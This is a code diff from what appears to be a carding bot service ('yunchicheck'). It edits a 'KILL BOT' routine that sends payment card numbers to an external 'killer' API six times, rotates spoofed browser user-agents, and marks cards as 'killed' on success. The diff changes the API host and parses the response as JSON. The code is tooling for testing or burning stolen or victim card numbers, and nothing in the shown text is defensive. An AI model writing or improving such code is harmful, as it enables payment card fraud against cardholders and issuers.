@@ -6126,7 +6126,7 @@ Top up at yunchicheck.com/dashboard/topup
         'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
       ];
       
-      const apiUrl = `https://killer-2-gates-pyjk.vercel.app/ko/cc=${cc}?key=anmokupvttt`;
+      const apiUrl = `https://killer-edbu.onrender.com/kill?cc=${cc}`;
       
       // Send 6 requests sequentially and collect responses
       const responses: { attempt: number; status: string; response: string; time: string }[] = [];
@@ -6151,8 +6151,14 @@ Top up at yunchicheck.com/dashboard/topup
           const attemptTime = ((Date.now() - attemptStart) / 1000).toFixed(2);
           console.log(`[KILL BOT] Attempt ${i} for ${profile.username}: ${rawText}`);
           
-          // Check for success
-          const attemptKilled = rawText.includes("KILLED SUCCESSFULLY");
+          // Check for success via JSON response
+          let attemptKilled = false;
+          try {
+            const jsonData = JSON.parse(rawText);
+            attemptKilled = jsonData.success === true;
+          } catch {
+            attemptKilled = false;
+          }
           if (attemptKilled) {
             isKilled = true;
           }
